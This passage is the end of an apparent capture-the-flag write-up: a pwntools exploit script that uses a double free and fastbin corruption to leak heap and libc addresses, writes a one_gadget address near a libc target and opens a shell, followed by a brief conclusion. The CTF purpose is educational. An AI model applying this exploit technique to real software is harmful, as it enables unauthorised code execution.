+</span><span>    </span><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>0x70</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'0'</span><span style=color:#f29668>*</span><span style=color:#f29718>0x60 </span><span style=color:#f29668>+ </span><span style=color:#ffb454>p64</span><span>(</span><span style=color:#f29718>0</span><span>) </span><span style=color:#f29668>+ </span><span style=color:#ffb454>p64</span><span>(</span><span style=color:#f29718>0x21</span><span>))
+</span><span>    </span><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>0x70</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'1'</span><span style=color:#f29668>*</span><span style=color:#f29718>0x40 </span><span style=color:#f29668>+ </span><span style=color:#ffb454>p64</span><span>(</span><span style=color:#f29718>0</span><span>) </span><span style=color:#f29668>+ </span><span style=color:#ffb454>p64</span><span>(</span><span style=color:#f29718>0x71</span><span>) </span><span style=color:#f29668>+ </span><span style=color:#c2d94c>'1'</span><span style=color:#f29668>*</span><span style=color:#f29718>0x10  </span><span style=color:#f29668>+ </span><span style=color:#ffb454>p64</span><span>(</span><span style=color:#f29718>0</span><span>) </span><span style=color:#f29668>+ </span><span style=color:#ffb454>p64</span><span>(</span><span style=color:#f29718>0x21</span><span>))
+</span><span>    </span><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>0x90</span><span style=color:#bfbab0cc>,</span><span style=color:#ffb454>p64</span><span>(</span><span style=color:#f29718>0</span><span>) </span><span style=color:#f29668>+ </span><span style=color:#ffb454>p64</span><span>(</span><span style=color:#f29718>0x71</span><span>) </span><span style=color:#f29668>+ </span><span style=color:#c2d94c>'2'</span><span style=color:#f29668>*</span><span style=color:#f29718>0x30 </span><span style=color:#f29668>+ </span><span style=color:#ffb454>p64</span><span>(</span><span style=color:#f29718>0</span><span>) </span><span style=color:#f29668>+ </span><span style=color:#ffb454>p64</span><span>(</span><span style=color:#f29718>0x71</span><span>) </span><span style=color:#f29668>+ </span><span style=color:#ffb454>p64</span><span>(</span><span style=color:#f29718>0</span><span>) </span><span style=color:#f29668>+ </span><span style=color:#ffb454>p64</span><span>(</span><span style=color:#f29718>0x21</span><span>))
+</span><span>    </span><span style=font-style:italic;color:#5c6773>#add(0x90,'3'*0x10 + p64(0) + p64(0xe1) + '1'*0x20 + p64(0) + p64(0x71))
+</span><span>    </span><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>0xd0</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'3333'</span><span>)
+</span><span>    </span><span style=color:#ffb454>free</span><span>(</span><span style=color:#f29718>1</span><span>)
+</span><span>    </span><span style=color:#ffb454>free</span><span>(</span><span style=color:#f29718>3</span><span>)    </span><span style=font-style:italic;color:#5c6773># 3->1
+</span><span>    </span><span style=color:#ffb454>free</span><span>(</span><span style=color:#f29718>0</span><span>)    </span><span style=font-style:italic;color:#5c6773># 0->2->1
+</span><span>    </span><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>0x10</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'</span><span style=color:#95e6cb>\xf0</span><span style=color:#c2d94c>'</span><span>) </span><span style=font-style:italic;color:#5c6773>#chunk number 4, which takes away 0th chunk for header and chunk 2 for note
+</span><span>    </span><span style=color:#ffb454>free</span><span>(</span><span style=color:#f29718>4</span><span>)    </span><span style=font-style:italic;color:#5c6773># 4->1
+</span><span>    </span><span style=color:#ffb454>reu</span><span>(</span><span style=color:#c2d94c>'will free: '</span><span>)
+</span><span>    heap_base </span><span style=color:#f29668>= </span><span style=color:#ffb454>u64</span><span>(</span><span style=color:#ffb454>re</span><span>(</span><span style=color:#f29718>6</span><span>) </span><span style=color:#f29668>+ </span><span style=color:#c2d94c>'</span><span style=color:#95e6cb>\x00</span><span style=color:#c2d94c>'</span><span style=color:#f29668>*</span><span style=color:#f29718>2</span><span>) </span><span style=color:#f29668>- </span><span style=color:#f29718>0xf0
+</span><span>    log</span><span style=color:#f29668>.</span><span style=color:#ffb454>info</span><span>(</span><span style=color:#c2d94c>"heap @ " </span><span style=color:#f29668>+ </span><span style=color:#f07178>hex</span><span>(heap_base))
+</span><span>    </span><span style=color:#ffb454>free</span><span>(</span><span style=color:#f29718>1</span><span>) </span><span style=font-style:italic;color:#5c6773>#Double Free --  1->4->1
+</span><span>    </span><span style=color:#ffb454>free</span><span>(</span><span style=color:#f29718>3</span><span>) </span><span style=font-style:italic;color:#5c6773># 3->1->4->1 
+</span><span>    fake_chunk </span><span style=color:#f29668>= </span><span>heap_base </span><span style=color:#f29668>+ </span><span style=color:#f29718>0x130
+</span><span>    fake_chunk_2 </span><span style=color:#f29668>= </span><span>heap_base </span><span style=color:#f29668>+ </span><span style=color:#f29718>0x90
+</span><span>    </span><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>0x10</span><span style=color:#bfbab0cc>,</span><span style=color:#ffb454>p64</span><span>(fake_chunk)) </span><span style=font-style:italic;color:#5c6773>#chunk number 5 , which takes chunk 3 as header and chunk 1 taken as note , its fd overwritten with fake chunk , => 4->1->fake_chunk
+</span><span>    </span><span style=color:#ffb454>free</span><span>(</span><span style=color:#f29718>2</span><span>)    </span><span style=font-style:italic;color:#5c6773># 2->4->1->fake_chunk
+</span><span>    </span><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>0x10</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'</span><span style=color:#95e6cb>\xf0</span><span style=color:#c2d94c>'</span><span>) </span><span style=font-style:italic;color:#5c6773>#chunk 6 , which takes chunk 2 as header and chunk 5 as its note, now fastbin left with => 1->fake_chunk
+</span><span>    </span><span style=font-style:italic;color:#5c6773>#We get our overlapping chunk
+</span><span>    </span><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>0x10</span><span style=color:#bfbab0cc>,</span><span style=color:#ffb454>p64</span><span>(</span><span style=color:#f29718>0</span><span>) </span><span style=color:#f29668>+ </span><span style=color:#ffb454>p64</span><span>(</span><span style=color:#f29718>0xe1</span><span>)) </span><span style=font-style:italic;color:#5c6773># chunk number 7, Faking header's size to small bin , chunk 1 taken as header and fake_chunk returned as overlapping chunk
+</span><span>    </span><span style=color:#ffb454>free</span><span>(</span><span style=color:#f29718>2</span><span>)
+</span><span>    </span><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>0x10</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'</span><span style=color:#95e6cb>\x78</span><span style=color:#c2d94c>'</span><span>) </span><span style=font-style:italic;color:#5c6773>#Chunk 8, returned from unsorted bin having fd and bk as libc
+</span><span>    </span><span style=color:#ffb454>free</span><span>(</span><span style=color:#f29718>8</span><span>)
+</span><span>    </span><span style=color:#ffb454>reu</span><span>(</span><span style=color:#c2d94c>'will free: '</span><span>)
+</span><span>    libc_base </span><span style=color:#f29668>= </span><span style=color:#ffb454>u64</span><span>(</span><span style=color:#ffb454>re</span><span>(</span><span style=color:#f29718>6</span><span>) </span><span style=color:#f29668>+ </span><span style=color:#c2d94c>'</span><span style=color:#95e6cb>\x00</span><span style=color:#c2d94c>'</span><span style=color:#f29668>*</span><span style=color:#f29718>2</span><span>) </span><span style=color:#f29668>- </span><span style=color:#f29718>0x3c4b78
+</span><span>    log</span><span style=color:#f29668>.</span><span style=color:#ffb454>info</span><span>(</span><span style=color:#c2d94c>'libc_base @ ' </span><span style=color:#f29668>+ </span><span style=color:#f07178>hex</span><span>(libc_base))
+</span><span>    one_gadget </span><span style=color:#f29668>= </span><span>libc_base </span><span style=color:#f29668>+ </span><span style=color:#f29718>0xf02a4
+</span><span>    target </span><span style=color:#f29668>= </span><span>libc_base </span><span style=color:#f29668>+ </span><span style=color:#f29718>0x3c4aed
+</span><span>
+</span><span>    </span><span style=font-style:italic;color:#5c6773>#Fake 0x71 size 2 chunks
+</span><span>    </span><span style=color:#ffb454>free</span><span>(</span><span style=color:#f29718>0</span><span>) </span><span style=font-style:italic;color:#5c6773>#0
+</span><span>    </span><span style=color:#ffb454>free</span><span>(</span><span style=color:#f29718>1</span><span>) </span><span style=font-style:italic;color:#5c6773>#1->0
+</span><span>    </span><span style=color:#ffb454>free</span><span>(</span><span style=color:#f29718>0</span><span>) </span><span style=font-style:italic;color:#5c6773>#0->1->0
+</span><span>    </span><span style=color:#ffb454>free</span><span>(</span><span style=color:#f29718>2</span><span>) </span><span style=font-style:italic;color:#5c6773>#2->0->1->0
+</span><span>    </span><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>0x10</span><span style=color:#bfbab0cc>,</span><span style=color:#ffb454>p64</span><span>(fake_chunk_2)) </span><span style=font-style:italic;color:#5c6773>#1->0->fake_chunk2
+</span><span>    </span><span style=color:#ffb454>free</span><span>(</span><span style=color:#f29718>2</span><span>) </span><span style=font-style:italic;color:#5c6773>#2->1->0->fake_chunk2
+</span><span>    </span><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>0x10</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'</span><span style=color:#95e6cb>\xf0</span><span style=color:#c2d94c>'</span><span>) </span><span style=font-style:italic;color:#5c6773>#0->fake_chunk2
+</span><span>    </span><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>0x10</span><span style=color:#bfbab0cc>,</span><span style=color:#ffb454>p64</span><span>(</span><span style=color:#f29718>0</span><span>) </span><span style=color:#f29668>+ </span><span style=color:#ffb454>p64</span><span>(</span><span style=color:#f29718>0x71</span><span>)) 
+</span><span>
+</span><span>    </span><span style=color:#ffb454>free</span><span>(</span><span style=color:#f29718>0</span><span>) </span><span style=font-style:italic;color:#5c6773>#0
+</span><span>    </span><span style=color:#ffb454>free</span><span>(</span><span style=color:#f29718>3</span><span>) </span><span style=font-style:italic;color:#5c6773>#3->0
+</span><span>    </span><span style=color:#ffb454>free</span><span>(</span><span style=color:#f29718>0</span><span>) </span><span style=font-style:italic;color:#5c6773>#0->3->0
+</span><span>    </span><span style=color:#ffb454>free</span><span>(</span><span style=color:#f29718>2</span><span>) </span><span style=font-style:italic;color:#5c6773>#2->0->3->0
+</span><span>    </span><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>0x10</span><span style=color:#bfbab0cc>,</span><span style=color:#ffb454>p64</span><span>(fake_chunk)) </span><span style=font-style:italic;color:#5c6773>#3->0->fake_chunk
+</span><span>    </span><span style=color:#ffb454>free</span><span>(</span><span style=color:#f29718>2</span><span>) </span><span style=font-style:italic;color:#5c6773>#2->3->0->fake_chunk
+</span><span>    </span><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>0x10</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'</span><span style=color:#95e6cb>\xf0</span><span style=color:#c2d94c>'</span><span>)
+</span><span>    </span><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>0x10</span><span style=color:#bfbab0cc>,</span><span style=color:#ffb454>p64</span><span>(</span><span style=color:#f29718>0</span><span>) </span><span style=color:#f29668>+ </span><span style=color:#ffb454>p64</span><span>(</span><span style=color:#f29718>0x71</span><span>))
+</span><span>
+</span><span>    </span><span style=font-style:italic;color:#5c6773>#free 0x71 chunks , double free
+</span><span>    </span><span style=color:#ffb454>free</span><span>(</span><span style=color:#f29718>2</span><span>) </span><span style=font-style:italic;color:#5c6773>#2
+</span><span>    </span><span style=color:#ffb454>free</span><span>(</span><span style=color:#f29718>1</span><span>) </span><span style=font-style:italic;color:#5c6773>#1->2
+</span><span>    </span><span style=color:#ffb454>free</span><span>(</span><span style=color:#f29718>2</span><span>) </span><span style=font-style:italic;color:#5c6773>#2->1->2
+</span><span>    </span><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>0x60</span><span style=color:#bfbab0cc>,</span><span style=color:#ffb454>p64</span><span>(target)) </span><span style=font-style:italic;color:#5c6773>#1->4->target
+</span><span>    </span><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>0x60</span><span style=color:#bfbab0cc>,</span><span style=color:#ffb454>p64</span><span>(target)) </span><span style=font-style:italic;color:#5c6773>#4->target
+</span><span>    </span><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>0x60</span><span style=color:#bfbab0cc>,</span><span style=color:#ffb454>p64</span><span>(target)) </span><span style=font-style:italic;color:#5c6773>#target->Null
+</span><span>    </span><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>0x60</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'a'</span><span style=color:#f29668>*</span><span style=color:#f29718>19 </span><span style=color:#f29668>+ </span><span style=color:#ffb454>p64</span><span>(one_gadget)) </span><span style=font-style:italic;color:#5c6773>#Getting the target chunk for writing one_gadget
+</span><span>    </span><span style=color:#ffb454>free</span><span>(</span><span style=color:#f29718>0</span><span>)
+</span><span>    gdb</span><span style=color:#f29668>.</span><span style=color:#ffb454>attach</span><span>(io)
+</span><span>    </span><span style=color:#ffb454>free</span><span>(</span><span style=color:#f29718>0</span><span>)
+</span><span>    io</span><span style=color:#f29668>.</span><span style=color:#ffb454>interactive</span><span>()
+</span><span>
+</span></code></pre><h2 id=conclusion>CONCLUSION</h2><p>All in All , this challenge provides a really good way to learn about fastbin corruption and creating overlapping chunks in memory.</section></article></main></div>
